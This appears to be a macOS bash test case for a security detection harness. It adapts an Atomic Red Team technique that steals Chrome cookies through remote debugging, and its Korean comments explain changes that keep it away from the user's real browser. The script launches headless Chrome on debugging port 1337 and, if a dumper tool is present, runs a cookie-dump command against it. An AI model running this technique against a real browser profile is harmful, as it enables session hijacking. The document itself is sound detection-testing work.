#!/usr/bin/env bash
# id: A04
# attack: T1539
# atomic: Atomic Red Team T1539 #3 (Steal Chrome Cookies via Remote Debugging (Mac))
# expect: detected
# rule: NONE
# requires: Google Chrome
# type: process
# probe: {MARK}
# 내 Chrome 은 건드리지 않는다. 임시 --user-data-dir 로 별도 headless Chrome 을 띄우고 cleanup 에서 그 인스턴스만 끈다.
# ART 와 다른 점: killall 'Google Chrome' 을 뺐다(내 Chrome 종료 방지). open -a 대신 바이너리를 직접 띄운다
#   (open 은 이미 떠 있는 Chrome 에 인자를 넘기고 새 프로필을 무시한다).
# WhiteChocolateMacademiaNut(chocolate)은 받지 않는다. /tmp/WhiteChocolateMacademiaNut/chocolate 이 이미 있을 때만 돌리고 출력(쿠키)은 버린다.
# 번들 룰 중 명령행이 맞는 것이 없다(쿠키 룰은 cp, cat, grep 등과 Cookies 경로가 필요). 미탐이 예상이다.
set -euo pipefail
CHROME="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
case "${1:?run|cleanup}" in
  run)
    [ -x "$CHROME" ] || { echo "SKIP: Chrome not installed"; exit 0; }
    # 임시 프로필로 headless Chrome 을 원격 디버깅 포트 1337 로 띄운다
    "$CHROME" --headless=new --user-data-dir="$WORK/chrome-profile" --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ about:blank >/dev/null 2>&1 &
    echo $! > "$WORK/pid"
    sleep 3
    # 쿠키 덤퍼가 있을 때만 ART 의 마지막 명령을 돌린다. 임시 프로필이라 쿠키는 비어 있고 출력은 버린다
    if [ -x /tmp/WhiteChocolateMacademiaNut/chocolate ]; then
      /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337 >/dev/null 2>&1 || true
    else
      echo "NOTE: chocolate 이 없어 Chrome 기동 단계만 실행했다"
    fi
    ;;
  cleanup)
    # 이 시험의 임시 프로필을 쓰는 프로세스(본체와 helper)만 끈다
    pkill -f -- "--user-data-dir=$WORK/chrome-profile" 2>/dev/null || true
    [ -f "$WORK/pid" ] && kill "$(cat "$WORK/pid")" 2>/dev/null || true
    sleep 1
    rm -f "$WORK/pid"
    rm -r "$WORK/chrome-profile" 2>/dev/null || true
    ;;
esac
